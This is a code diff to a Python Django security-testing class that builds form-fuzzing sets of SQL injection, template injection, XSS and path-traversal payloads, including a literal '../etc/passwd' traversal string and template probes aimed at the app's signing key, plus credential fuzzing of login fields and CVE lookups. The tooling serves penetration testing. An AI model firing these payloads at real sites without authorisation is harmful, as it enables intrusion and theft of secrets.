@@ -35,7 +35,7 @@ import re
 
 from res.regex.secrets import secrets as secrets_regex
 from siddhis.prana import prana
-
+#from siddhis.tictrac import tictrac
 
 
 class DJUtils:
@@ -182,7 +182,6 @@ class DJUtils:
         ]
 
     def get_wrmail(self):
-
         return (    
             Generic('fr').person.surname()[:3]\
             + Generic('fr').person.title()\
@@ -190,9 +189,38 @@ class DJUtils:
             + Generic('fr').person.email()
         )
 
-    def set_form_fuzz(self,**base_form):
+    def parse_data_set(self, data_set, base_form, payloads):
+        from itertools import product
+
+        results = []
+        final_sets = []
+
+        for k,v in base_form.items():
+            if k in data_set:
+                values = data_set[k] if isinstance(data_set[k], list) else [data_set[k]]
+            else:
+                values = [choice(payloads)]
+
+            results.append([(k, val) for val in values])
+
+        for combination in product(*results):
+            final_sets.append(dict(combination))
+            
+        return final_sets
+
+    def set_form_fuzz(self, base_form:dict, data_set:dict=False) -> dict:
+
         fuzz_all = {}
         fuzz_scope = {
+            'mixed_data': [],
+            'all_values_set_email': [],
+            'input_value_rpay': [],
+            'sqli_payloads':[],
+            'ssti_payloads':[],
+            'random_payloads':[],
+            'xss_payloads':[],
+            'pt_payloads': [],
+            'random_params':[],
             'nullf':[],
             'rawin':[],
             'allin':[],
@@ -223,42 +251,91 @@ class DJUtils:
         )    
             
         # fuzz with empty form / step 0
-        fuzz_scope['nullf'].append({})
-        fuzz_scope['rawin'].append(base_form)
+        fuzz_scope['nullf'].append(
+            {}
+        )
+        fuzz_scope['rawin'].append(
+            base_form
+        )
+        
+        fuzz_scope['all_values_set_email'].append(
+            {key: self.get_wrmail()
+                for key in base_form}
+        )
+        fuzz_scope['input_value_rpay'].append(
+            {choice(all_payloads): choice(all_payloads)
+                for key in base_form}
+        )
+
+        fuzz_scope['sqli_payloads'].append(
+            {key: choice(sqli_payloads) 
+                for key in base_form}
+        )
+        fuzz_scope['ssti_payloads'].append(
+            {key: choice(ssti_payloads) 
+                for key in base_form}
+        )
+        fuzz_scope['xss_payloads'].append(
+            {key: choice(xss_payloads) 
+                for key in base_form}
+        )
+        fuzz_scope['random_payloads'].append(
+            {key: choice(all_payloads) 
+                for key in base_form}
+        )
+        fuzz_scope['pt_payloads'].append(
+            {key: "%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd" 
+                for key in base_form}
+        )
+        
+
+        keys = list(base_form.keys())
+        for i in range(1, len(keys) + 1):
+            new_dict = {key: choice(all_payloads) for key in keys[:i]}
+            fuzz_scope['random_params'].append(new_dict)
 
         # fuzz all inputs / step 2
+        n={}
         for field, value in base_form.items():
-            fuzz_scope['sstip_headers'].append({field:"{{ messages.storages.0.signer.key }}"})
-            fuzz_scope['sstip_values'].append({"{{ messages.storages.0.signer.key }}": value})
-            fuzz_scope['sstip_all'].append({"{% debug %}":"{{ messages.storages.0.signer.key }}"})
+
+            fuzz_scope['sstip_headers'].append({field:choice(all_payloads)})
+            fuzz_scope['sstip_values'].append({choice(ssti_payloads): value})
+            fuzz_scope['sstip_all'].append({choice(ssti_payloads):choice(ssti_payloads)})
 
             fuzz_scope['allin'].append({field: choice(all_payloads)})
             fuzz_scope['ptpay'].append({field:"%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"})
             
             # fuzz usercontrolled inputs [no actions] / step 3
             if field not in ['next', 'submit','csrfmiddlewaretoken']:
-                fuzz_scope['useri'].append({choice(all_payloads): choice(all_payloads)})
-                fuzz_scope['payfv'].append({choice(all_payloads): choice(all_payloads)})
+                fuzz_scope['useri'].append({field: choice(all_payloads)})
+                fuzz_scope['payfv'].append({field: choice(all_payloads)})
             
             # fuzz auth endpoints - with valid values / invalid creds
-            if field in ['username', 'user', 'usuário', 'usuario']:
+            if field in ['username', 'user', 'usuario']:
                 creds = vfp.get_random_credential()
+                username = creds.get('username')
 
-                fuzz_scope['iauth'].append({field: creds.get('username')})
-                fuzz_scope['authfuzz'].append({field:"{{ messages.storages.0.signer.key}}"})
-                fuzz_scope['authfuzz'].append({"{% debug %}":creds.get('username')})
+                fuzz_scope['iauth'].append({field: username})
+                fuzz_scope['authfuzz'].append({field:choice(all_payloads)})
+                fuzz_scope['authfuzz'].append({choice(all_payloads):username})
 
             elif field in ['password', 'senha', 'secret', 'passwd']:
+                creds = vfp.get_random_credential()
                 fuzz_scope['iauth'].append({field: creds.get('password')})
-                fuzz_scope['authfuzz'].append({field:"{{ messages.storages.0.signer.key }}"})
-                fuzz_scope['authfuzz'].append({"{{ messages.storages.0.signer.key }}":creds.get('password')})
+                fuzz_scope['authfuzz'].append({field:choice(all_payloads)})
+                fuzz_scope['authfuzz'].append({choice(all_payloads):creds.get('password')})
 
             elif field in ['email', 'user_email', 'emailaddress', 'mail']:
-                fuzz_scope['iauth'].append({field: self.get_wrmail()}) 
+                _email_ = self.get_wrmail()
+                fuzz_scope['iauth'].append({field: _email_}) 
+                fuzz_scope['authfuzz'].append({choice(all_payloads):choice(all_payloads)})
+                fuzz_scope['authfuzz'].append({field:choice(all_payloads)})
+                fuzz_scope['authfuzz'].append({field:f"{self.get_wrmail()} {choice(all_payloads)}"})
 
-                fuzz_scope['authfuzz'].append({"{% debug %}":"{{ messages.storages.0.signer.key }}@{% debug %}"})
-                fuzz_scope['authfuzz'].append({field:"{{ messages.storages.0.signer.key }}@{% debug %}"})
-                fuzz_scope['authfuzz'].append({"{{ messages.storages.0.signer.key }}":self.get_wrmail()})
+        if data_set:
+
+            fuzzsets = self.parse_data_set(data_set, base_form, all_payloads)
+            fuzz_scope['mixed_data'].extend(fuzzsets)
 
         return fuzz_scope
 
@@ -570,11 +647,10 @@ class DJUtils:
         tickets_tbl = self.get_report_tables().get('tickets')
 
         if not tickets:
-
             from siddhis.tictrac import tictrac
 
             self.fuzz_handler['django_version'] = django_version
-            self.tickets = tictrac.siddhi(**self.fuzz_handler).get_ticket_ids()
+            self.tickets,issues_table = tictrac.siddhi(**self.fuzz_handler).get_ticket_ids()
 
         else:
             self.tickets = tickets
@@ -667,10 +743,13 @@ class DJUtils:
                         tickets_tbl = sttinger_data.get('tickets_tbl')
                 else:
                     # - Get CVEs and security tickets for abducted framework version-
-                    #tickets = tictrac.siddhi(django_version).start()
-                    cves = prana.siddhi(**{'django_version':django_version}).get_cves()
-                    tickets_tbl = self.get_tickets_table(django_version)
+                    from siddhis.tictrac import tictrac
 
+                    cves, cves_table = prana.siddhi(**{'django_version':django_version}).get_cves_for_version()
+                    tickets,tickets_table = tictrac.siddhi(**{'django_version':django_version}).get_ticket_ids()
+                    #tickets_tbl = self.get_tickets_table(django_version)
+                
+                    '''
                 # CVE table
                 if cves and cves is not None:
                     cves_tbl.title = colored(
@@ -688,11 +767,11 @@ class DJUtils:
                         )
                 else: 
                     pass
-
+                    '''
         return {
-            'tickets_tbl': tickets_tbl.get_string(),
-            'cves_tbl': cves_tbl.get_string(),
-            'tickets': self.tickets,
+            'tickets_tbl': tickets_table,
+            'cves_tbl': cves_table,
+            'tickets': tickets,
             'cves':cves
         }
 
@@ -808,7 +887,7 @@ class DJUtils:
             if rgx_check:
                 print(f"              {colored(rgx_check.group(),'red')}")
 
-    def extract_metadata(self,extract_type,*except_objs):
+    def extract_metadata(self, extract_type,*except_objs):
         
         if extract_type in ['ss', 'secret_scan']:
             self.secret_scan(except_objs[0]['APP_RESPONSE'])
